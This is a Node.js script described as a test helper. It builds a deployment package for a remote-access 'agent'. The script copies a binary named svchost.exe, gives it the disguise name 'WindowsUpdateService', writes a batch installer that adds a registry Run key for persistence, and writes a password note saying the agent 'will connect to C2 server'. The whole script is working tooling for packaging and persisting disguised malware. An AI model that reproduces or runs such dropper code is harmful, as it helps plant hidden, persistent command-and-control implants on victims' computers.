// Create Pre-Configured MSI for Testing (Simple Version)
const fs = require('fs');
const path = require('path');

async function createTestMSI() {
    const tempDir = path.join(__dirname, 'temp');
    if (!fs.existsSync(tempDir)) {
        fs.mkdirSync(tempDir, { recursive: true });
    }

    const agentId = 'TEST_AGENT_001';
    const serviceName = 'WindowsUpdateService';
    const agentPassword = 'TestPassword123!';
    
    // Copy the base client
    const baseClientPath = path.join(__dirname, '../../dist/svchost.exe');
    const agentExePath = path.join(tempDir, `agent_${agentId}.exe`);
    
    if (fs.existsSync(baseClientPath)) {
        fs.copyFileSync(baseClientPath, agentExePath);
        console.log(`✅ Copied base client: ${fs.statSync(agentExePath).size} bytes`);
    } else {
        console.log('❌ Base client not found, creating dummy file');
        fs.writeFileSync(agentExePath, 'Test Agent Executable');
    }

    // Create a simple MSI-like package (for testing purposes)
    const msiPath = path.join(tempDir, `agent_${agentId}.msi`);
    fs.copyFileSync(agentExePath, msiPath);
    
    // Create installer script
    const installerScript = `@echo off
echo Installing ${serviceName}...
mkdir "%ProgramFiles%\\${serviceName}" 2>nul
copy "%~dp0agent_${agentId}.exe" "%ProgramFiles%\\${serviceName}\\${serviceName}.exe"
reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${serviceName}" /t REG_SZ /d "%ProgramFiles%\\${serviceName}\\${serviceName}.exe" /f
echo Installation complete!
pause`;
    
    const installerPath = path.join(tempDir, `install_${agentId}.bat`);
    fs.writeFileSync(installerPath, installerScript);

    // Create password file
    const passwordContent = `TEST AGENT PACKAGE
===================
Agent ID: ${agentId}
Service: ${serviceName}
Password: ${agentPassword}

DEPLOYMENT:
1. Extract archive with password: ${agentPassword}
2. Run agent_${agentId}.msi
3. Or run install_${agentId}.bat
4. Agent will connect to C2 server

Files:
- agent_${agentId}.msi: MSI installer
- agent_${agentId}.exe: Standalone executable
- install_${agentId}.bat: Batch installer
`;

    const passwordPath = path.join(tempDir, `passwords_${agentId}.txt`);
    fs.writeFileSync(passwordPath, passwordContent);

    console.log(`✅ Test MSI package created in: ${tempDir}`);
    console.log(`📦 Files created:`);
    console.log(`   - agent_${agentId}.msi (${fs.statSync(msiPath).size} bytes)`);
    console.log(`   - agent_${agentId}.exe (${fs.statSync(agentExePath).size} bytes)`);
    console.log(`   - install_${agentId}.bat (${fs.statSync(installerPath).size} bytes)`);
    console.log(`   - passwords_${agentId}.txt (${fs.statSync(passwordPath).size} bytes)`);
    console.log(`🔑 Password: ${agentPassword}`);
    
    return {
        tempDir,
        password: agentPassword,
        agentId,
        serviceName,
        files: {
            msi: msiPath,
            exe: agentExePath,
            bat: installerPath,
            txt: passwordPath
        }
    };
}

createTestMSI().catch(console.error);


